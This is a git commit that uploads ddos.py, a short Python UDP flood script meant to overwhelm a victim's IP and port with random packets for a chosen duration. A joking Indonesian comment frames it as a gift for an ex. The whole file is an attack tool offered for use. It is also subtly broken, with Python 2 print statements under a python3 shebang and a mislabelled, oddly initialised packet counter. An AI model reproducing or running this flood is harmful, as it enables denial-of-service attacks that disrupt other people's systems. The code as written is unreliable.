0b341fc521570d00a4385aa0e288b08768020b87
Tn. Kacamata <56512216+TnKacamata024@users.noreply.github.com>
2019-10-13 23:03:26 +0700

    Add files via upload

---
+++ ddos.py
@@ -0,0 +1,43 @@
+#!/usr/bin/python3
+# -*- coding: utf-8 -*-
+#Created By Tn. Kacamata
+
+# python 3.3.2+ dDos Script v.1
+# by gushtyan
+# DDos Kirim kado terindah buat mantan
+
+
+import time
+import socket
+import random
+import sys
+
+def usage():
+    print "Command: " + sys.argv[0] + " <ip> <port> <packet>"
+
+def flood(victim, vport, duration):
+    # okay so here I create the server, when i say "SOCK_DGRAM" it means it's a UDP type program
+    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    # 1024 representes one byte to the server
+    bytes = random._urandom(1024)
+    timeout =  time.time() + duration
+    sent = 3000
+
+    while 1:
+        if time.time() > timeout:
+            break
+        else:
+            pass
+        client.sendto(bytes, (victim, vport))
+        sent = sent + 1
+        print "Attacking %s sent packages %s at the port %s "%(sent, victim, vport)
+
+def main():
+    print len(sys.argv)
+    if len(sys.argv) != 4:
+        usage()
+    else:
+        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
+
+if __name__ == '__main__':
+    main()
